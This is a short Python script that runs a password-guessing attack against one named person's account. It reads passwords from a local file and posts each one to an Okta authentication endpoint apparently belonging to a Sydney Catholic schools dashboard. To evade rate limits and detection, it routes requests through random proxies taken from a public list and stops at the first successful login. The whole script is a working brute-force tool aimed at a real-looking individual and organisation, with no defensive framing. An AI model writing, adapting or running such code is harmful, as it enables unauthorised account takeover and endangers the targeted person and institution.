import requests
import json
import random

# read the passwords from the password.txt file
with open('Desktop/passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file]

# read the proxies from the proxy list
proxy_list = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt").text.strip().split('\n')
proxies = [{'http': proxy.strip()} for proxy in proxy_list]

# set the username
username = "dean.biordi@syd.catholic.edu.au"

# loop through the passwords and send login requests with a random proxy
for password in passwords:
    # choose a random proxy from the list
    proxy = random.choice(proxies)
    print("Using proxy:", proxy['http'])

    # send the login request with the current password and proxy
    url = 'https://dashboard-syd.cenet.catholic.edu.au/api/v1/authn'
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-Okta-User-Agent-Extended': 'okta-signin-widget-5.4.1'
    }
    data = {
        'password': password,
        'username': username,
        'options': {
            'warnBeforePasswordExpired': True,
            'multiOptionalFactorEnroll': False
        }
    }
    try:
        response = requests.post(url, headers=headers, data=json.dumps(data), proxies=proxy)
        if response.status_code == 200:
            print(f"Login successful with password: {password}")
            break
        else:
            print(f"Login failed with password: {password}")
    except:
        print("Error occurred, trying next proxy...")
